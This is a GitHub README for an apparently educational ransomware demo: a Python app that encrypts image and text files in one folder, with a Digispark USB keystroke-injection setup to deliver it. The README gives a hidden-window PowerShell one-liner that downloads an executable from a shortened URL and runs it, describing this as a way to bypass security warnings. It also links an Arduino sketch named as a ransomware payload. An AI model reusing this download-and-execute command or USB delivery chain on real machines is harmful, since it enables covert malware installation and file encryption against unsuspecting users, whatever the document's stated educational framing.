**EDUCATIONAL USE ONLY, USE AT YOUR OWN RISK!** \
**IT IS ALWAYS RECOMMENDED TO TEST THESE KINDS OF PROGRAMS INSIDE A VIRTUAL MACHINE WITH NO SENSITIVE INFORMATION INCASE OF SOMETHING GOES WRONG**

**Version 1.0**

![bio](https://github.com/therealhalonen/PhishSticks/assets/112076418/8e7f742d-bdc4-41d0-9aaa-8a6493df29f7)

## What it is 

Simple application made with python and tkinter to demonstrate how an application can encrypt and decrypt your files with extensions {'.txt', '.jpg', '.jpeg', '.png'} in the directory called TestDirz338

If combined with the PowerShell script below, the application gets downloaded and executed in path `{USER}\TestDirz338\` 

Right now the application decrypts all {'.txt', '.jpg', '.jpeg', '.png'} files when user gives up the right password (lihapulla).

![270753154-8fb9e882-b990-48cd-add6-309dd09af3be](https://github.com/therealhalonen/PhishSticks/assets/112076418/bee3e9ec-499b-4a0e-af8b-fc5e2c04b4ea)

## How to use

Download and run the script or .exe file inside a safe folder called TestDirz338 with no important files (incase something goes wrong) and enjoy, for example:

```
$ mkdir TestDirz338
$ cd TestDirz338
$ python3 encrypt.py
```
OR

Make a folder called TestDirz338 in the path C:/Users/{USER}/

![2023-12-05_18-59](https://github.com/therealhalonen/PhishSticks/assets/112076418/6682c7df-debb-40ce-bba0-aea449f228f4)


Bypass security warnings and download & execute the file instantly in TestDirz338 folder by typing the following code into Run (Win+R) on **Windows**:
```
powershell -w hidden -c "(New-Object System.Net.WebClient).DownloadFile('https://tinyurl.com/28sb6pvc', \"$env:UserProfile\TestDirz338\malware.exe\");Start-Process \"$env:UserProfile\TestDirz338\malware.exe\" -WorkingDir \"$env:UserProfile\TestDirz338\""
```
If you don't have a folder called TestDirz338 and you execute the code above, nothing happens. Also trying to run the executable anywhere else raises an error:

![2023-12-05_18-56](https://github.com/therealhalonen/PhishSticks/assets/112076418/85b533aa-ec2b-40af-9d5d-66121cf92b4f)

How it works: https://www.youtube.com/watch?v=glqK_-qdDkw

Executable version works the same without needing different python libraries.

---

### To set up Digispark payload:
- [Set up Digispark](https://github.com/therealhalonen/PhishSticks/blob/master/notes/ollikainen/notes.md#digispark)
- Add correct Digikeyboard library to match your systems keyboard layout for example [DigiKeyboardFi.h](https://github.com/therealhalonen/DigiKeyboardFi/blob/master/DigiKeyboardFi.h) for Finnish keyboards (made by [therealhalonen](https://github.com/therealhalonen))
- Path of the file for Windows: C:/Users/username/Documents/Arduino/libraries/DigisparkKeyboard/DigiKeyboardFi.h
- Path of the file for Linux: ~/.arduino15/packages/digistump/hardware/avr/1.6.7/libraries/DigisparkKeyboard/DigiKeyboardFi.h
- compile and upload [digispark_ransomware.ino](https://github.com/therealhalonen/PhishSticks/blob/master/digispark/digispark_ransomware/digispark_ransomware.ino) to your digispark
- Plug the Digispark in a computers USB slot and enjoy
  
![2023-12-05_19-12](https://github.com/therealhalonen/PhishSticks/assets/112076418/835e2937-1551-41fc-91f6-2b135fd5e0cb)



Watch the video to see it in action: https://www.youtube.com/watch?v=Bi2QOMSHeKI
